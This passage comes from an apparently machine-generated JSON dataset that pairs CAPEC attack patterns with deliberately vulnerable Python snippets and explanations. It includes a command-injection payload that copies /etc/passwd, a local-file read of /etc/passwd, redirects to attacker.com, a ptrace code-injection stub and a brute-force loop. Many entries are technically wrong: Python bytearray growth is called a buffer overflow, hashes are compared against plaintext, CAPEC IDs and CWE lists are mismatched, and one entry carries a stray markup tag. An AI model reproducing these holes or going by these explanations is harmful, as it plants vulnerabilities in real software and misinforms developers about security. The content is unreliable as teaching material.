        "code_snippet": "import os\nimport threading\n\ndef access_file(file_path):\n    if os.access(file_path, os.R_OK):\n        # Time-of-check Time-of-use (TOCTOU) Race Condition\n        # The file's state can change between the check and the use\n        with open(file_path, 'r') as file:\n            content = file.read()\n            return content\n\n# Context Switching Race Condition\n# A race condition allows an attacker to modify the file during the switch\nthread1 = threading.Thread(target=access_file, args=('file.txt',))\nthread2 = threading.Thread(target=os.remove, args=('file.txt',))\nthread1.start()\nthread2.start()\n",
        "description": "This code snippet demonstrates a Time-of-check Time-of-use (TOCTOU) Race Condition (CWE-367) and a Context Switching Race Condition (CWE-368). The access_file function checks if a file is accessible before trying to read it, but an attacker can remove the file between the check and the use, causing the program to fail. The use of multiple threads increases the likelihood of this race condition occurring."
    },
    {
        "capec_id": "30",
        "capec_name": "Hijacking a Privileged Thread of Execution",
        "code_snippet": "import ctypes\nimport os\nimport threading\n\n# CWE-270: Privilege Context Switching Error\n# CWE-114: Process Control\n# CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')\n# CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n\n# Define a shared resource\nshared_resource = 0\n\n# Define a function to be executed concurrently\ndef vulnerable_function():\n    global shared_resource\n    # CWE-362: Race Condition\n    while True:\n        shared_resource += 1\n        # CWE-78: OS Command Injection\n        os.system('echo ' + str(shared_resource) + ' > /tmp/output')\n\n# Create multiple threads to execute the vulnerable function concurrently\nthreads = []\nfor i in range(10):\n    t = threading.Thread(target=vulnerable_function)\n    threads.append(t)\n    t.start()\n\n# CWE-1421: Exposure of Sensitive Information in Shared Microarchitectural Structures during Transient Execution\n# (Note: This CWE is related to processor events and is not directly applicable to Python code)\n\n# CWE-270: Privilege Context Switching Error\n# Suspend an existing thread and manipulate its memory\nthread_id = threading.current_thread().ident\nlibc = ctypes.CDLL(None)\nlibc.ptrace(0, thread_id, 1, 0)\nlibc.ptrace(1, thread_id, 0, 0)\n\n# Inject malicious code into the suspended thread\nmalicious_code = b'\\x90\\x90\\x90'  # Replace with actual malicious code\nlibc.ptrace(4, thread_id, 0, malicious_code)\nlibc.ptrace(7, thread_id, 0, 0)\n",
        "description": "Python code snippet demonstrating the CAPEC of hijacking a privileged thread of execution by injecting malicious code into a running process, leveraging CWEs 270, 114, 362, 78, and 1421."
    },
    {
        "capec_id": "31",
        "capec_name": "Accessing/Intercepting/Modifying HTTP Cookies",
        "code_snippet": "import http.cookies\n\ndef authenticate_user(username, password):\n    if username == 'admin' and password == 'password':\n        cookie = http.cookies.SimpleCookie()\n        cookie['session_id'] = '1234567890'\n        cookie['session_id']['expires'] = 31536000\n        cookie['username'] = username\n        cookie['password'] = password\n        return cookie\n    else:\n        return None\n\ndef check_session_id(cookie):\n    if 'session_id' in cookie:\n        return True\n    else:\n        return False\n\ndef main():\n    username = input('Enter username: ')\n    password = input('Enter password: ')\n    cookie = authenticate_user(username, password)\n    if cookie:\n        print('Authenticated!')\n        print('Cookie:', cookie)\n        # No validation or integrity checking of the cookie\n        # No encryption of sensitive data\n        # No input validation\n        # No session fixation protection\n        # No protection against external control of critical state data\n        # No protection against HTTP request/response splitting\n    else:\n        print('Authentication failed!')\n\nif __name__ == '__main__':\n    main()",
        "description": "This code snippet demonstrates the CAPEC of using HTTP Cookies to store credentials, state information, and other critical data on client systems without proper validation, integrity checking, encryption, and input validation. The code uses a simple cookie to store the username and password, and does not properly validate or encrypt the data. It also does not protect against session fixation, external control of critical state data, or HTTP request/response splitting. This code is vulnerable to various attacks, including cookie tampering, session hijacking, and data theft."
    },
    {
        "capec_id": "32",
        "capec_name": "XSS Through HTTP Query Strings",
        "code_snippet": "import flask\n\napp = flask.Flask(__name__)\n\n@app.route('/search')\ndef search():\n    query = flask.request.args.get('query')\n    return '<h1>Search results for ' + query + '</h1>'\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This Python code snippet demonstrates a vulnerable web application that is susceptible to cross-site scripting (XSS) attacks. The application uses the Flask web framework and defines a route for handling search queries. The search query is retrieved from the HTTP query string and embedded directly into the HTML response without proper validation or encoding, making it vulnerable to XSS attacks."
    },
    {
        "capec_id": "33",
        "capec_name": "HTTP Request Smuggling",
        "code_snippet": "import requests\n\n\nproxy_server = 'http://myproxy.com'\n\nmalicious_url = 'http://example.com/malicious'\n\nheaders = {\n    'Host': 'example.com',\n    'Content-Length': '0',\n    'Connection': 'keep-alive',\n    'Proxy-Connection': 'keep-alive',\n    'Cache-Control': 'max-age=0',\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',\n    'Upgrade-Insecure-Requests': '1',\n    'User-Agent': 'Mozilla/5.0',\n    'Accept-Encoding': 'gzip, deflate, sdch',\n    'Accept-Language': 'en-US,en;q=0.8',\n}\n\n\nreq = requests.Request('GET', malicious_url, headers=headers)\n\nprep = req.prepare()\n\ns = requests.Session()\n\ns.proxies = {'http': proxy_server, 'https': proxy_server}\n\nresp = s.send(prep)\n\nprint(resp.status_code)\n",
        "description": "This Python code snippet demonstrates the concept of HTTP Request Smuggling (CAPEC-273) by exploiting inconsistencies in HTTP request parsing and interpretation between different intermediary HTTP agents. The code sends a malicious HTTP request to a proxy server, which then forwards the request to the target server. The request is crafted to bypass security controls and potentially lead to unauthorized access or data tampering. The related CWEs (444, 113, 918, 352, 441) highlight the vulnerabilities in HTTP request handling that can be exploited in this attack."
    },
    {
        "capec_id": "34",
        "capec_name": "HTTP Response Splitting",
        "code_snippet": "import http.server\nimport socketserver\n\nPORT = 8000\n\nclass RequestHandler(http.server.SimpleHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header('Content-type', 'text/html; charset=utf-8')\n        self.end_headers()\n        self.wfile.write(b'<html><body><h1>Vulnerable HTTP Response</h1></body></html>')\n        # CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n        self.wfile.write(b'<script>alert(\"Injected Script\")</script>')\n        # CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting')\n        self.wfile.write(b'\\r\\n\\r\\n<html><body><h1>Injected HTTP Response</h1></body></html>')\n        # CWE-138: Improper Neutralization of Special Elements\n        self.wfile.write(b'<script>document.location=\"http://attacker.com/\"</script>')\n        # CWE-436: Interpretation Conflict\n        self.wfile.write(b'<meta http-equiv=\"refresh\" content=\"0; url=http://attacker.com/\" />')\n        # CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n        self.wfile.write(b'HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body><h1>Smuggled HTTP Response</h1></body></html>')\n\nwith socketserver.TCPServer(('', PORT), RequestHandler) as httpd:\n    print('Serving at port', PORT)\n    httpd.serve_forever()",
        "description": "This Python code snippet demonstrates a vulnerable HTTP server that is susceptible to HTTP response splitting and smuggling attacks. It injects malicious content into the HTTP response, including script tags, meta refresh tags, and smuggled HTTP responses, which can be exploited by an adversary to manipulate the user's session or steal sensitive information."
    },
    {
        "capec_id": "35",
        "capec_name": "Leverage Executable Code in Non-Executable Files",
        "code_snippet": "import os\n\n# CWE-94: Improper Control of Generation of Code ('Code Injection')\n# CWE-96: Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection')\n# CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\n\nconfig_file = 'config.txt'\n\n# CWE-59: Improper Link Resolution Before File Access ('Link Following')\n# CWE-282: Improper Ownership Management\nif os.access(config_file, os.R_OK):\n    with open(config_file, 'r') as f:\n        config_data = f.read()\n        # CWE-97: Improper Neutralization of Server-Side Includes (SSI) Within a Web Page\n        # CWE-270: Privilege Context Switching Error\n        # CWE-272: Least Privilege Violation\n        exec(config_data)\nelse:\n    print('Config file not accessible')",
        "description": "This code snippet demonstrates a vulnerable code that loads a configuration file and executes its contents using the exec function, which can lead to code injection attacks. The code also has issues with link resolution, ownership management, and privilege context switching, making it vulnerable to various attacks."
    },
    {
        "capec_id": "36",
        "capec_name": "Using Unpublished Interfaces or Functionality",
        "code_snippet": "class AdminPanel:\n    def __init__(self):\n        self.admin_functions = {'delete_user': self.delete_user, 'create_admin': self.create_admin}\n\n    def delete_user(self, username):\n        # No authentication or authorization checks\n        print(f'Deleting user {username}')\n\n    def create_admin(self, username):\n        # No authentication or authorization checks\n        print(f'Creating admin user {username}')\n\n    def invoke_function(self, function_name, *args):\n        # No input validation or authentication\n        if function_name in self.admin_functions:\n            return self.admin_functions[function_name](*args)\n        else:\n            print('Invalid function')\n\n# Example usage:\nadmin_panel = AdminPanel()\nadmin_panel.invoke_function('delete_user', 'john_doe')\nadmin_panel.invoke_function('create_admin', 'jane_doe')",
        "description": "This code snippet demonstrates the CAPEC of unauthorized access to interfaces or functionality. The AdminPanel class has two sensitive functions, delete_user and create_admin, which can be invoked by anyone without any authentication or authorization checks. The invoke_function method allows an attacker to call these functions by simply providing the function name and arguments, without any input validation or authentication. This code embodies CWEs 306, 693, 695, 1242, and 862."
    },
    {
        "capec_id": "37",
        "capec_name": "Retrieve Embedded Sensitive Data",
        "code_snippet": "import os\nimport getpass\nimport hashlib\n\n# CWE-226: Sensitive Information in Resource Not Removed Before Reuse\n# CWE-311: Missing Encryption of Sensitive Data\n# CWE-312: Cleartext Storage of Sensitive Information\n\n# Storing sensitive data in cleartext in a file\nf = open('sensitive_data.txt', 'w')\nf.write('username:' + getpass.getuser() + '\\n')\nf.write('password:' + 'mysecretpassword' + '\\n')\nf.close()\n\n# CWE-525: Use of Web Browser Cache Containing Sensitive Information\n# CWE-314: Cleartext Storage in the Registry\n# CWE-315: Cleartext Storage of Sensitive Information in a Cookie\n\n# Storing sensitive data in cleartext in a cookie\ncookie = {'username': getpass.getuser(), 'password': 'mysecretpassword'}\n\n# CWE-318: Cleartext Storage of Sensitive Information in Executable\n\n# Storing sensitive data in cleartext in an executable\nos.system('echo \"username=' + getpass.getuser() + ',password=mysecretpassword\" > sensitive_data.sh')\n\n# CWE-1239: Improper Zeroization of Hardware Register\n# CWE-1258: Exposure of Sensitive System Information Due to Uncleared Debug Information\n# CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\n# CWE-1272: Sensitive Information Uncleared Before Debug/Power State Transition\n# CWE-1278: Missing Protection Against Hardware Reverse Engineering Using Integrated Circuit (IC) Imaging Techniques\n# CWE-1301: Insufficient or Incomplete Data Removal within Hardware Component\n# CWE-1330: Remanent Data Readable after Memory Erase\n\n# Not properly clearing sensitive information from built-in registers\n# when the user of the hardware block changes\n\n# Not fully clearing security-sensitive values, such as keys and intermediate values in cryptographic operations,\n# when debug mode is entered\n\n# Not properly providing a capability for the product administrator to remove sensitive data at the time the product is decommissioned\n\n# Not clearing sensitive information that should no longer be accessible due to changes to information access restrictions\n\n# Not protecting against hardware reverse engineering using integrated circuit (IC) imaging techniques\n\n# Not completely deleting all data and potentially sensitive information within hardware components\n\n# Not properly erasing confidential information stored in memory circuits\n",
        "description": "This Python code snippet demonstrates the CAPEC of an attacker examining a target system to find sensitive data that has been embedded within it. The code stores sensitive data in cleartext in various locations, including files, cookies, and executables, and does not properly clear sensitive information from hardware registers, debug information, and decommissioned devices. This code embodies the CWEs of sensitive information in resource not removed before reuse, missing encryption of sensitive data, cleartext storage of sensitive information, and more."
    },
    {
        "capec_id": "38",
        "capec_name": "Leveraging/Manipulating Configuration File Search Paths",
        "code_snippet": "import os\nimport sys\n\n# CWE-426: Untrusted Search Path\nsys.path.insert(0, '/tmp/malicious_path')\n\n# CWE-427: Uncontrolled Search Path Element\nos.environ['PATH'] = '/tmp/malicious_path:' + os.environ['PATH']\n\n# CWE-73: External Control of File Name or Path\nfilename = input('Enter a file name: ')\nopen(filename, 'r')\n\n# CWE-555: J2EE Misconfiguration: Plaintext Password in Configuration File\nconfig_file = open('/path/to/config/file', 'r')\npassword = config_file.read()\n\n# CWE-99: Improper Control of Resource Identifiers ('Resource Injection')\nresource_id = input('Enter a resource ID: ')\nos.system('curl http://example.com/' + resource_id)\n",
        "description": "This code snippet demonstrates the CAPEC pattern of attack where an adversary loads a malicious resource into a program's standard path. The code modifies the search path, allows user input to control file names and paths, stores a plaintext password in a configuration file, and uses user input as a resource identifier, all of which can lead to the execution of malicious components."
    },
    {
        "capec_id": "39",
        "capec_name": "Manipulating Opaque Client-based Data Tokens",
        "code_snippet": "import hashlib\n\ndef authenticate_user(username, password, session_id):\n    # CWE-285: Improper Authorization\n    # No authorization check is performed\n    if username == 'admin' and password == 'password':\n        return session_id\n\n    return None\n\ndef set_session_cookie(session_id, user_data):\n    # CWE-565: Reliance on Cookies without Validation and Integrity Checking\n    # Cookie is set without validation or integrity checking\n    cookie = {'session_id': session_id, 'user_data': user_data}\n    return cookie\n\ndef get_user_data(cookie):\n    # CWE-315: Cleartext Storage of Sensitive Information in a Cookie\n    # Sensitive information is stored in cleartext in the cookie\n    return cookie['user_data']\n\ndef main():\n    username = 'admin'\n    password = 'password'\n    session_id = '1234567890'\n    user_data = {'role': 'admin', 'balance': 1000}\n\n    # CWE-472: External Control of Assumed-Immutable Web Parameter\n    # Assumed-immutable web parameter (user_data) is externally controllable\n    authenticated_session_id = authenticate_user(username, password, session_id)\n    if authenticated_session_id:\n        cookie = set_session_cookie(authenticated_session_id, user_data)\n        # CWE-539: Use of Persistent Cookies Containing Sensitive Information\n        # Persistent cookie contains sensitive information\n        print('Authenticated. Cookie:', cookie)\n        # CWE-384: Session Fixation\n        # Existing session identifier is not invalidated\n        print('User data:', get_user_data(cookie))\n\nif __name__ == '__main__':\n    main()",
        "description": "This code snippet demonstrates the CAPEC pattern of manipulating client-side tokens to bypass security mechanisms. It includes several CWEs, including missing support for integrity checks, improper authorization, authentication bypass, external control of assumed-immutable web parameters, reliance on cookies without validation and integrity checking, cleartext storage of sensitive information in a cookie, use of persistent cookies containing sensitive information, session fixation, and improper handling of parameters. The code allows an attacker to manipulate the user data stored in the cookie, which can lead to unauthorized access or data tampering."
    },
    {
        "capec_id": "40",
        "capec_name": "Manipulating Writeable Terminal Devices",
        "code_snippet": "import os\n\n# CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')\n# CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n# CWE-114: Process Control\n\ndef vulnerable_function(user_input):\n    # CWE-214: Invocation of Process Using Visible Sensitive Information\n    command = f\"/bin/echo {user_input} > /tmp/output\"\n    os.system(command)\n\n# CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\n# Assuming /etc/passwd is accessible to the attacker\nuser_input = \"; cp /etc/passwd /tmp/output ;\"\nvulnerable_function(user_input)",
        "description": "This Python code snippet demonstrates a command injection vulnerability. The `vulnerable_function` takes user input and constructs an OS command using it. The `os.system` function is then used to execute the command, allowing an attacker to inject malicious commands. In this example, the attacker can copy the /etc/passwd file to a temporary directory, exposing sensitive information."
    },
    {
        "capec_id": "41",
        "capec_name": "Using Meta-characters in E-mail Headers to Inject Malicious Payloads",
        "code_snippet": "import smtplib\n\n\nfrom email.mime.multipart import MIMEMultipart\nfrom email.mime.text import MIMEText\n\n\nmsg = MIMEMultipart()\nmsg['Subject'] = 'Injected Header<script>alert(1)</script>'\nmsg['From'] = 'attacker@example.com'\nmsg['To'] = 'victim@example.com'\n\nbody = 'Injected Body<script>alert(2)</script>'\nmsg.attach(MIMEText(body, 'html'))\n\nserver = smtplib.SMTP('smtp.example.com')\nserver.sendmail('attacker@example.com', 'victim@example.com', msg.as_string())\nserver.quit()",
        "description": "This Python code snippet demonstrates an email header injection attack, which is a type of CAPEC that leverages meta-characters in email headers to inject improper behavior into email programs. The code constructs an email message with a malicious subject and body, containing script tags that can be executed by the email client. This code is vulnerable to CWE-150 (Improper Neutralization of Escape, Meta, or Control Sequences), CWE-88 (Improper Neutralization of Argument Delimiters in a Command), CWE-697 (Incorrect Comparison), CWE-644 (Improper Neutralization of HTTP Headers for Scripting Syntax), and CWE-116 (Improper Encoding or Escaping of Output)."
    },
    {
        "capec_id": "42",
        "capec_name": "MIME Conversion",
        "code_snippet": "import email\n\ndef convert_to_mime(user_input):\n    mime_msg = email.mime.Text.MIMEText(user_input, _subtype='plain', _charset='utf-8')\n    return mime_msg.as_string()\n\ndef process_mime(mime_str):\n    mime_msg = email.message_from_string(mime_str)\n    body = mime_msg.get_payload()\n    buffer = bytearray(1024)\n    buffer.extend(body.encode())\n    return buffer\n\nuser_input = 'A' * 2048\nmime_str = convert_to_mime(user_input)\nprocess_mime(mime_str)",
        "description": "This code snippet demonstrates a vulnerable MIME conversion routine that can lead to a buffer overflow. The `convert_to_mime` function takes user input and converts it to a MIME-compatible format. The `process_mime` function then processes this MIME string, copying the payload to a fixed-size buffer without checking the size of the input. This can cause a buffer overflow, allowing an attacker to gain control over the mail server machine."
    },
    {
        "capec_id": "43",
        "capec_name": "Exploiting Multiple Input Interpretation Layers",
        "code_snippet": "import re\n\ndef validate_input(input_data):\n    if re.match('^[a-zA-Z0-9_]+$', input_data):\n        return True\n    else:\n        return False\n\ndef parser1(input_data):\n    return input_data.replace('\\\\', '/')\n\ndef parser2(input_data):\n    return input_data.replace('/', '\\\\\\\\')\n\ndef process_input(input_data):\n    if validate_input(parser1(input_data)):\n        return parser2(input_data)\n    else:\n        return 'Invalid input'\n\ninput_data = 'a\\\\b\\\\c'\nprint(process_input(input_data))",
        "description": "This code snippet demonstrates the CAPEC, where an attacker can bypass input validation by providing input with layers of special characters. The input validation function only checks if the input contains alphanumeric characters and underscores, but the parser functions modify the input by replacing special characters. An attacker can provide input that passes the validation but is modified by the parsers to become malicious. In this example, the input 'a\\\\b\\\\c' is validated as it contains only alphanumeric characters and backslashes, but after passing through the parsers, it becomes 'a/b/c\\\\', which could be used for command injection or other attacks."
    },
    {
        "capec_id": "44",
        "capec_name": "Overflow Binary Resource File",
        "code_snippet": "import os\n\ndef process_jpeg_file(file_path):\n    buffer_size = 1024\n    buffer = bytearray(buffer_size)\n    with open(file_path, 'rb') as file:\n        file.readinto(buffer)\n    # No check for buffer overflow\n    return buffer\n\n# CWE-646: Relying on file extension to determine behavior\nfile_path = 'malicious.jpg'\n\n# CWE-69: Improper handling of Windows ::DATA alternate data stream\nif os.path.isfile(file_path):\n    buffer = process_jpeg_file(file_path)\n    # CWE-697: Incorrect comparison\n    if len(buffer) > 1024:\n        print('Buffer size is larger than expected.')</code_snippet>\n",
        "description": "This Python code snippet demonstrates a vulnerable function that processes a JPEG file without properly checking for buffer overflows. It relies on the file extension to determine the behavior, and it does not handle Windows ::DATA alternate data streams correctly. The function reads the file into a buffer without checking its size, which can lead to a buffer overflow. Additionally, the code performs an incorrect comparison to check the buffer size."
    },
    {
        "capec_id": "45",
        "capec_name": "Buffer Overflow via Symbolic Links",
        "code_snippet": "import os\n\n# CWE-285: Improper Authorization\n# CWE-302: Authentication Bypass by Assumed-Immutable Data\nusername = 'attacker'\npassword = 'password'\n\nif username == 'admin' and password == 'password':\n    # CWE-20: Improper Input Validation\n    # CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n    user_input = input('Enter a file path: ')\n    if os.path.islink(user_input):\n        # CWE-118: Incorrect Access of Indexable Resource ('Range Error')\n        # CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n        # CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')\n        # CWE-680: Integer Overflow to Buffer Overflow\n        # CWE-697: Incorrect Comparison\n        buffer_size = 1024\n        buffer = bytearray(buffer_size)\n        with open(user_input, 'r') as file:\n            file.readinto(buffer)\n        print(buffer.decode('utf-8'))\n    else:\n        print('Invalid file path')\nelse:\n    print('Invalid credentials')",
        "description": "This code snippet demonstrates a vulnerable Python script that processes symbolic links, which can lead to buffer overflows. The script lacks proper input validation, authorization, and access control, making it susceptible to various attacks. An attacker can manipulate the symbolic link file to cause a buffer overflow, potentially leading to code execution or data corruption."
    },
    {
        "capec_id": "46",
        "capec_name": "Overflow Variables and Tags",
        "code_snippet": "import configparser\n\ndef parse_config(file_path):\n    config = configparser.ConfigParser()\n    config.read(file_path)\n    buffer = bytearray(1024)\n    for section in config.sections():\n        for key, value in config.items(section):\n            buffer.extend(str.encode(f\"{section}:{key}={value}\\n\"))\n    return buffer\n\n# Vulnerable code\nconfig_file = 'malicious_config.ini'\noverflow_buffer = parse_config(config_file)\nprint(overflow_buffer.decode())",
        "description": "This Python code snippet demonstrates a buffer overflow vulnerability due to improper input validation and lack of size checking. The `parse_config` function reads a configuration file and stores its contents in a fixed-size buffer. An attacker can craft a malicious configuration file with oversized strings, causing the buffer to overflow. The CWEs embodied in this code snippet include CWE-120 (Buffer Copy without Checking Size of Input), CWE-118 (Incorrect Access of Indexable Resource), CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer), CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component), CWE-20 (Improper Input Validation), CWE-680 (Integer Overflow to Buffer Overflow), CWE-733 (Compiler Optimization Removal or Modification of Security-critical Code), and CWE-697 (Incorrect Comparison)."
    },
    {
        "capec_id": "47",
        "capec_name": "Buffer Overflow via Parameter Expansion",
        "code_snippet": "def process_input(input_data):\n    buffer = bytearray(10)\n    for i in range(len(input_data)):\n        buffer.append(input_data[i])\n    return buffer\n\ninput_data = 'A' * 100\nresult = process_input(input_data)\nprint(result)",
        "description": "This Python code snippet demonstrates a classic buffer overflow vulnerability. The function process_input() copies the input_data into a fixed-size buffer without checking the size of the input, leading to a buffer overflow. This is an example of CWE-120: Buffer Copy without Checking Size of Input. The input_data is intentionally set to a large size to trigger the buffer overflow. The function does not perform any input validation, which is an example of CWE-20: Improper Input Validation. The code also does not handle the length of the input data correctly, which is an example of CWE-130: Incorrect Calculation of Buffer Size."
    },
    {
        "capec_id": "48",
        "capec_name": "Passing Local Filenames to Functions That Expect a URL",
        "code_snippet": "import os\n\ndef get_local_file(file_path):\n    try:\n        with open(file_path, 'r') as f:\n            return f.read()\n    except FileNotFoundError:\n        return 'File not found'\n\ndef get_system_info():\n    return {'platform': os.name, 'cwd': os.getcwd()}\n\ndef handle_request(file_path):\n    if file_path.startswith('file:///'):\n        return get_local_file(file_path[7:])\n    elif file_path.startswith('http://') or file_path.startswith('https://'):\n        # Send request to remote server\n        return 'Sending request to remote server'\n    else:\n        return 'Invalid request'\n\n# Example usage\nfile_path = 'file:///etc/passwd'\nprint(handle_request(file_path))\nprint(get_system_info())",
        "description": "This Python code snippet demonstrates the CAPEC attack by accessing local files and resources instead of URLs. It uses CWE-241 by not handling unexpected data types, CWE-706 by using incorrectly-resolved names, CWE-598 by using GET requests with sensitive query strings, CWE-84 by not neutralizing encoded URI schemes, and CWE-646 by relying on file names or extensions. The code defines functions to read local files and get system information, and then uses these functions to handle requests. The example usage shows how an attacker can use this code to access sensitive files and system information."
    },
    {
        "capec_id": "49",
        "capec_name": "Password Brute Forcing",
        "code_snippet": "import hashlib\nimport itertools\nimport string\nimport time\n\n# CWE-521: Weak Password Requirements\n# CWE-257: Storing Passwords in a Recoverable Format\npasswords = ['password123', 'qwerty', 'letmein']\n\n# CWE-307: Improper Restriction of Excessive Authentication Attempts\n# CWE-308: Use of Single-factor Authentication\n# CWE-309: Use of Password System for Primary Authentication\ndef check_password(username, password):\n    for stored_password in passwords:\n        if hashlib.sha256(password.encode()).hexdigest() == stored_password:\n            return True\n    return False\n\n# CWE-262: Not Using Password Aging\n# CWE-263: Password Aging with Long Expiration\n# CWE-654: Reliance on a Single Factor in a Security Decision\ndef brute_force_attack(username):\n    chars = string.ascii_letters + string.digits + string.punctuation\n    for length in range(1, 10):\n        for attempt in itertools.product(chars, repeat=length):\n            password = ''.join(attempt)\n            if check_password(username, password):\n                print(f'Password found: {password}')\n                return\n            time.sleep(0.1)  # CWE-307: Improper Restriction of Excessive Authentication Attempts\n\nbrute_force_attack('admin')",
        "description": "This code snippet demonstrates a brute force attack on a system with weak password requirements, inadequate password storage, and insufficient authentication attempt restrictions. The attacker tries every possible password combination until they succeed, highlighting the vulnerabilities in the system."
    },
    {
        "capec_id": "50",
        "capec_name": "Password Recovery Exploitation",
        "code_snippet": "import hashlib\n\ndef recover_password(username, answer):\n    # CWE-522: Insufficiently Protected Credentials\n    # CWE-257: Storing Passwords in a Recoverable Format\n    password_hash = get_password_hash_from_database(username)\n    if password_hash:\n        # CWE-640: Weak Password Recovery Mechanism for Forgotten Password\n        # CWE-309: Use of Password System for Primary Authentication\n        # CWE-521: Weak Password Requirements\n        if hashlib.sha256(answer.encode()).hexdigest() == password_hash:\n            return generate_new_password(username)\n    return None\n\ndef get_password_hash_from_database(username):\n    # CWE-257: Storing Passwords in a Recoverable Format\n    # CWE-522: Insufficiently Protected Credentials\n    password_hash = db.query(\"SELECT password FROM users WHERE username = '\" + username + \"'\")\n    return password_hash\n\ndef generate_new_password(username):\n    # CWE-521: Weak Password Requirements\n    new_password = 'default_password'\n    db.query(\"UPDATE users SET password = '\" + new_password + \"' WHERE username = '\" + username + \"'\")\n    return new_password",
        "description": "This code snippet demonstrates a weak password recovery mechanism. It stores password hashes in a recoverable format, uses a weak password recovery mechanism, and has weak password requirements. An attacker can take advantage of this mechanism to gain access to the system with the same privileges as the original user."
    },
    {
        "capec_id": "51",
        "capec_name": "Poison Web Service Registry",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# CWE-314: Cleartext Storage in the Registry\nregistry_data = {'service_name': 'malicious_service', 'service_url': 'http://malicious.com/service'}\n\n# CWE-651: Exposure of WSDL File Containing Sensitive Information\nwsdl_file = ET.Element('definitions')\nwsdl_file.set('name', 'malicious_service')\nwsdl_file.set('targetNamespace', 'http://malicious.com/service')\n\n# CWE-285: Improper Authorization\ndef get_service_info(service_name):\n    if service_name == 'malicious_service':\n        return registry_data\n    else:\n        return None\n\n# CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\ndef get_service_url(service_info):\n    return f\"{service_info['service_url']}?param1={input('Enter param1: ')}&param2={input('Enter param2: ')}\"\n\n# CWE-693: Protection Mechanism Failure\ndef register_service(service_info):\n    # No authentication or authorization checks\n    print(f\"Registered service: {service_info['service_name']} at {service_info['service_url']}\")\n\nservice_name = input('Enter service name: ')\nif service_name:\n    service_info = get_service_info(service_name)\n    if service_info:\n        service_url = get_service_url(service_info)\n        register_service(service_info)\n        print(f\"Redirecting to: {service_url}\")",
        "description": "This Python code snippet demonstrates a vulnerable SOA registry that allows an attacker to redirect service requests to a malicious service provider. The registry stores sensitive information in cleartext, exposes WSDL files containing sensitive information, and lacks proper authorization and input validation, making it vulnerable to injection attacks. The code uses a simple XML parsing library to construct a WSDL file and performs no authentication or authorization checks when registering a service."
    },
    {
        "capec_id": "52",
        "capec_name": "Embedding NULL Bytes",
        "code_snippet": "import subprocess\n\ndef vulnerable_function(user_input):\n    command = 'echo ' + user_input + ' > output.txt'\n    subprocess.call(command, shell=True)\n\nuser_input = 'Hello\\x00World'\n\nvulnerable_function(user_input)",
        "description": "This Python code snippet demonstrates the CAPEC of embedding null bytes in input to the target software. The vulnerable_function takes user input and constructs a command using it. The input is not properly validated or neutralized, allowing an attacker to inject null bytes. The subprocess module is used to execute the command, which can lead to unexpected behavior or security vulnerabilities. CWEs 158, 172, 173, 74, 20, 697, and 707 are relevant to this code snippet."
    },
    {
        "capec_id": "53",
        "capec_name": "Postfix, Null Terminate, and Backslash",
        "code_snippet": "import urllib.parse\n\ndef validate_input(input_string):\n    if input_string.endswith('/'):\n        return True\n    else:\n        return False\n\ninput_string = 'example.com/%00/'\nif validate_input(input_string):\n    print('Input is valid')\nelse:\n    print('Input is not valid')",
        "description": "This code snippet demonstrates the CAPEC of using an alternate representation of NULL to bypass a filter. The validate_input function checks if the input string ends with a slash character. However, the input string is crafted to contain a NULL byte (%00) in the middle, which is not properly handled by the function. This allows an attacker to inject malicious input that would otherwise be filtered out. The related CWEs include CWE-158 (Improper Neutralization of Null Byte or NUL Character), CWE-172 (Encoding Error), CWE-173 (Improper Handling of Alternate Encoding), CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component), CWE-20 (Improper Input Validation), CWE-697 (Incorrect Comparison), and CWE-707 (Improper Neutralization)."
    },
    {
        "capec_id": "54",
        "capec_name": "Query System for Information",
        "code_snippet": "import sqlite3\n\nconn = sqlite3.connect('database.db')\ncur = conn.cursor()\n\nusername = 'admin'\npassword = 'password'\n\nquery = \"SELECT * FROM users WHERE username='\" + username + \"' AND password='\" + password + \"'\"\n\ntry:\n    cur.execute(query)\n    results = cur.fetchall()\n    if results:\n        print('Login successful!')\n    else:\n        print('Invalid credentials. Error:', cur.execute(query).fetchone()[0])\nexcept Exception as e:\n    print('An error occurred:', str(e))\n",
        "description": "This Python code snippet demonstrates a vulnerable login system that is susceptible to SQL injection (CWE-89) and exposes sensitive information through error messages (CWE-209). The code constructs an SQL query using user-inputted username and password, which can be manipulated by an attacker to access unauthorized data or infer sensitive information. The error handling mechanism also discloses sensitive information about the database environment. An adversary can probe the application's structure by submitting variants of expected queries, potentially revealing information beyond what the expected set of queries would provide (CAPEC)."
    },
    {
        "capec_id": "55",
        "capec_name": "Rainbow Table Password Cracking",
